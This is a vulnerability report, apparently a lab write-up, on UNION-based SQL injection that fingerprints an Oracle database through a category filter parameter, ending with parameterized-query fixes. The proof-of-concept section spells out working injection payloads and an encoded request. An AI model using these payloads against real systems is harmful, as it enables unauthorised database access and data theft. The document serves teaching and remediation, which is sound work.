# Vulnerability Report: SQL Injection UNION Attack Leading to Database Fingerprinting (Oracle)

* **Vulnerability Type:** SQL Injection (CWE-89) / Information Disclosure (CWE-200)

* **Severity:** High

* **Target Component:** Category Filter (`/filter?category=`)

* **OWASP Top 10 Mapping:** A03:2021 – Injection

## 1. Executive Summary

An SQL Injection (SQLi) vulnerability was identified in the application's product category filtering feature. By leveraging a UNION-based SQL injection technique on an Oracle database, an unauthenticated user can append arbitrary query results to the application's native HTTP response. This enables an attacker to perform database fingerprinting and extract sensitive system information, including the exact Oracle database version and build details.

## 2. Technical Analysis & Root Cause

The application accepts user input via the `category` query parameter and directly concatenates it into a dynamic SQL query without sanitization or parameterization. 

### Oracle Database Nuances
1. **Mandatory `FROM` Clause:** Oracle database syntax strictly requires a `FROM` clause for all `SELECT` queries. When querying dummy data or expressions without a specific table, the built-in system table `DUAL` must be referenced (e.g., `SELECT 'a' FROM DUAL`).
2. **System Table Access:** Oracle stores database build and version details in the `v$version` dynamic performance view under the `banner` column.

### Vulnerable Query Pattern
```sql
SELECT * FROM products WHERE category = '<USER_INPUT>' AND released = 1;
```

Because input is unsanitized, an attacker can append a `UNION SELECT` statement that forces the application to return records from internal system tables alongside legitimate product data.

## 3. Proof of Concept (PoC)

1. Intercept a legitimate category filter request using an HTTP proxy (e.g., Burp Suite):
   ```http
   GET /filter?category=Gifts HTTP/1.1
   Host: target-app.net
   ```

2. **Step 1: Determine Column Count**
   Inject the `ORDER BY` clause to identify the number of columns returned by the original query:
   * `' ORDER BY 1--` $\rightarrow$ `200 OK`
   * `' ORDER BY 2--` $\rightarrow$ `200 OK`
   * `' ORDER BY 3--` $\rightarrow$ `500 Internal Server Error`
   
   *Result:* An error at column 3 confirms that the query selects exactly **2 columns**.

3. **Step 2: Determine Column Data Types**
   Test compatibility for string data types using Oracle's required `FROM DUAL` syntax:
   ```text
   ' UNION SELECT 'a','a' FROM DUAL--
   ```
   *Result:* The application responds with `200 OK`, confirming that both columns accept string values.

4. **Step 3: Extract Version Information**
   Inject a payload targeting the Oracle `v$version` dynamic view to extract the database banner string:
   ```text
   ' UNION SELECT banner, NULL FROM v$version--
   ```
   Submit the formatted URL request:
   ```http
   GET /filter?category=%27%20UNION%20SELECT%20banner,%20NULL%20FROM%20v$version-- HTTP/1.1
   Host: target-app.net
   ```

5. **Result:** The database version details (e.g., `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`) are returned in the HTTP response body and rendered on the user interface.

## 4. Impact

* **Information Disclosure:** Uncontrolled access to core underlying system components, database vendors, and version releases.
* **Attack Surface Expansion:** Database version information allows attackers to pinpoint specific known vulnerabilities, exploits, and syntax nuances tailored to that database version.
* **Data Exfiltration:** Demonstrating a `UNION`-based injection proves that any table accessible to the current database user account can be exfiltrated.

## 5. Remediation & Developer Guidance

### Primary Fix: Parameterized Queries (Prepared Statements)
Bind user inputs as strictly data parameters to prevent structural modification of the underlying SQL statement.

#### Secure Code Implementation Example (Java / JDBC)
```java
// Secure implementation using PreparedStatements
String query = "SELECT * FROM products WHERE category = ? AND released = 1";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInputCategory);
ResultSet results = stmt.executeQuery();
```

#### Secure Code Implementation Example (Python / CX_Oracle or SQLAlchemy)
```python
# Secure implementation using parameterized queries
cursor.execute(
    "SELECT * FROM products WHERE category = :category AND released = 1",
    {'category': user_input_category}
)
```

## 6. References

* **CWE-89:** [Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
* **CWE-200:** [Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
* **OWASP:** [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)